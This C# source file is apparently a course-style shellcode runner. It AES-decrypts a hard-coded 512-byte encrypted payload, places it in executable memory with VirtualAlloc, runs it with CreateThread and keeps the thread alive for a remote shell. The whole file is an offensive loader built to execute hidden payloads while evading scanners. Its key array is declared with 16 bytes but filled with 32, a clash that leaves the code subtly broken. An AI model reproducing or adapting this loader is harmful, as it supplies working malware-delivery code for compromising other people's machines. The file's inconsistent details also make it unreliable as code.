using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace StayAwhile
{
    class AndListen
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // Key bytes
            byte[] Says = new byte[16] {
			0x26, 0xc3, 0x64, 0xf9, 0x0d, 0x30, 0x92, 0xd9, 0xc5, 0x07, 0x21, 0x14, 0xb7, 0xce, 0xf1,
			0xf0, 0xb9, 0xe4, 0x4a, 0x13, 0x37, 0x3f, 0xa5, 0x19, 0x1d, 0xcd, 0x6a, 0xd8, 0xa6, 0x70,
			0xef, 0x2a };

            // IV bytes
            byte[] Try = new byte[16] {
			0xaf, 0xd2, 0xa2, 0xa8, 0xa6, 0x37, 0x3f, 0x61, 0xb0, 0x3f, 0x01, 0x78, 0xe1, 0x40, 0xee,
			0x42 };

            // AES 128-bit encrypted shellcode
            byte[] Offsec = new byte[512] {
			0x27, 0x85, 0xbd, 0x13, 0xb3, 0xf8, 0xd2, 0x82, 0xbd, 0x15, 0xfb, 0x2f, 0x7a, 0x28, 0x27,
			0x68, 0xbe, 0x5d, 0x81, 0x69, 0xa7, 0xbb, 0x5f, 0x03, 0x85, 0x37, 0x43, 0x8b, 0xfc, 0x01,
			0x1a, 0x43, 0xe3, 0xb2, 0x53, 0x9a, 0x38, 0x62, 0xc5, 0x02, 0xe4, 0xf4, 0x20, 0x03, 0xe0,
			0xa3, 0xd9, 0xe8, 0xb3, 0xb9, 0x3b, 0x9f, 0x7c, 0x1e, 0x4e, 0x28, 0x1d, 0x10, 0x8d, 0xf7,
			0x5f, 0x7d, 0xee, 0x83, 0x92, 0x1b, 0x23, 0x94, 0xd7, 0xb2, 0x88, 0x40, 0x3d, 0x21, 0x4d,
			0x1a, 0x70, 0xdc, 0x76, 0x3f, 0xf3, 0x85, 0xf9, 0x75, 0xc7, 0x9a, 0xe5, 0x74, 0xab, 0x73,
			0xcf, 0x00, 0xde, 0xb9, 0xbf, 0x04, 0x9b, 0x74, 0x78, 0x6a, 0x51, 0x78, 0x67, 0x30, 0xc7,
			0x34, 0x54, 0x30, 0x40, 0x1d, 0x26, 0x4c, 0x41, 0x97, 0x2e, 0x55, 0x1b, 0xf9, 0x6f, 0x95,
			0x47, 0xf3, 0x58, 0x48, 0x32, 0xdf, 0x4a, 0x3d, 0x16, 0x01, 0xad, 0x15, 0x94, 0x75, 0xa5,
			0x5f, 0xd7, 0xe1, 0x90, 0xd5, 0xcb, 0xc6, 0x06, 0x2b, 0x52, 0xdf, 0x4f, 0x51, 0xef, 0xd9,
			0x2b, 0x8c, 0x8a, 0xcf, 0x79, 0x34, 0x4e, 0xbb, 0x8d, 0x32, 0x5d, 0xa7, 0xf4, 0xe5, 0x78,
			0xc2, 0x97, 0x9d, 0xec, 0xcc, 0x82, 0x32, 0xf1, 0x8c, 0xe1, 0x6c, 0xea, 0xac, 0xe8, 0xe1,
			0xb4, 0x58, 0x16, 0xf6, 0x8d, 0x51, 0x2d, 0x3d, 0x80, 0x68, 0x3e, 0x7c, 0x53, 0x96, 0x96,
			0xee, 0x27, 0x60, 0xa7, 0x2c, 0x2f, 0xf8, 0xe0, 0xb8, 0xf2, 0xb9, 0xfa, 0xad, 0x0b, 0x7b,
			0x2d, 0xf7, 0x78, 0x9a, 0x85, 0xb5, 0xba, 0x19, 0xb6, 0x57, 0x61, 0x08, 0xdd, 0x8c, 0xbd,
			0xdc, 0x91, 0xfc, 0x79, 0xd2, 0x47, 0xca, 0x04, 0x8b, 0xda, 0xff, 0xeb, 0xc2, 0x82, 0xf6,
			0x7a, 0xc7, 0xc6, 0x38, 0x09, 0x18, 0x3e, 0x13, 0xd8, 0xf2, 0x6a, 0x22, 0xb9, 0x85, 0xc6,
			0x63, 0x4f, 0xba, 0x07, 0xda, 0xca, 0xf4, 0xa4, 0x91, 0x46, 0xe1, 0xdd, 0xeb, 0x24, 0xb1,
			0xc5, 0xaa, 0xcf, 0x37, 0xc2, 0x62, 0xb2, 0x3c, 0x18, 0x75, 0x82, 0x72, 0xcd, 0x51, 0x3d,
			0x84, 0x1f, 0x7f, 0xce, 0xc7, 0xca, 0xd4, 0xf8, 0x8e, 0x97, 0x0e, 0x92, 0x88, 0xb2, 0xdd,
			0x2c, 0x75, 0x2f, 0x2c, 0xe2, 0xdf, 0x83, 0xfb, 0x92, 0x61, 0x3d, 0xc3, 0x84, 0x45, 0xb6,
			0x01, 0x12, 0x58, 0x72, 0xb4, 0xae, 0xb4, 0xf2, 0x02, 0x10, 0x37, 0xf1, 0x07, 0xfb, 0x3e,
			0x14, 0x10, 0x11, 0xd7, 0x99, 0x86, 0x78, 0x64, 0xa5, 0x94, 0xeb, 0x26, 0xe2, 0x64, 0x5e,
			0x2d, 0xde, 0x79, 0x1d, 0x6e, 0xff, 0xa7, 0x54, 0x9f, 0x6e, 0xf7, 0xb8, 0x9e, 0x5c, 0xf1,
			0x80, 0x62, 0x06, 0x99, 0x6c, 0x18, 0xba, 0xd6, 0x13, 0xbf, 0x9b, 0x2f, 0xb5, 0xdd, 0x26,
			0xb3, 0x68, 0x58, 0x53, 0xa5, 0x5d, 0xe8, 0x86, 0xf0, 0x1a, 0x96, 0x5e, 0xaf, 0xb5, 0x74,
			0x35, 0x2a, 0x78, 0x2d, 0xcb, 0xd1, 0x3d, 0x26, 0x7b, 0x9a, 0x8a, 0xc4, 0x98, 0xcf, 0x19,
			0x6f, 0x3c, 0x3c, 0x4f, 0x94, 0x59, 0x1a, 0xc5, 0xc6, 0x86, 0xbf, 0xbe, 0xfb, 0x46, 0x80,
			0x84, 0x92, 0x60, 0xfe, 0xd4, 0xdd, 0x7e, 0xcb, 0x78, 0x86, 0xa2, 0x68, 0xac, 0xbd, 0xab,
			0x29, 0xc3, 0x2f, 0x0b, 0x3e, 0xb2, 0x89, 0xa6, 0x94, 0x03, 0x1b, 0x7b, 0x25, 0x91, 0x85,
			0x6d, 0x64, 0xf2, 0xb0, 0xa8, 0x28, 0x34, 0x30, 0x0d, 0x43, 0x9b, 0xe4, 0x55, 0x25, 0x51,
			0x15, 0x9a, 0x5f, 0x4a, 0xb1, 0x12, 0xe8, 0xce, 0xa6, 0x77, 0x31, 0x2e, 0x53, 0xb3, 0x84,
			0xbd, 0xc6, 0x9b, 0x63, 0x03, 0x5a, 0xd4, 0x0c, 0xb9, 0x86, 0xdb, 0x21, 0x00, 0xa4, 0x85,
			0x7e, 0xda, 0x04, 0xb3, 0x62, 0x6e, 0xf2, 0x36, 0x9a, 0xf3, 0x68, 0x9d, 0x32, 0xcc, 0xd7,
			0x6a, 0x7f };

            // Decrypt our shellcode
            var crypto = new AndListen();
            byte[] Harder = crypto.Decrypt(Offsec, Says, Try);
            int size = Harder.Length;

            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            
            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(Harder, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
            
            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
